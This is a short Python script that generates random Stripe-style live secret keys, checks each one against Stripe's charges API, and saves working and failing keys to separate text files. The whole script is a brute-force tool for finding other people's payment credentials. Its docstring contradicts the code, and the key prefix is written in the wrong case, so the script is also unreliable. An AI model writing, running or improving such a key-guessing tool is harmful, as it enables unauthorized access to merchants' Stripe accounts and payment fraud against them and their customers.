	import random
	import string
	import requests
	import json
	 
	def generate_sk_key():
	    """Generates a random SK key with SK_live_51, random numbers and characters (lowercase and uppercase).
	    It has 50% chance to generate the same thing but up to 25 characters without the starting 51.
	    It generates up to 98 characters after it.
	    """
	    sk_key = "SK_live_51"
	    for i in range(25):
	        sk_key += random.choice(string.ascii_letters + string.digits)
	    return sk_key
	 
	def check_sk_key(sk_key):
	    """Checks if the SK key is valid using the Stripe API.
	    """
	    url = "https://api.stripe.com/v1/charges"
	    headers = {
	        "Authorization": "Bearer " + sk_key
	    }
	    response = requests.get(url, headers=headers)
	    if response.status_code == 200:
	        return True
	    else:
	        return False
	 
	def save_sk_key(sk_key, is_valid):
	    """Saves the SK key to either goodsk.txt or badsk.txt depending on whether it is valid or not.
	    """
	    if is_valid:
	        with open("goodsk.txt", "a") as f:
	            f.write(sk_key + "\n")
	    else:
	        with open("badsk.txt", "a") as f:
	            f.write(sk_key + "\n")
	 
	if __name__ == "__main__":
	    sk_key = generate_sk_key()
	    is_valid = check_sk_key(sk_key)
	    save_sk_key(sk_key, is_valid)
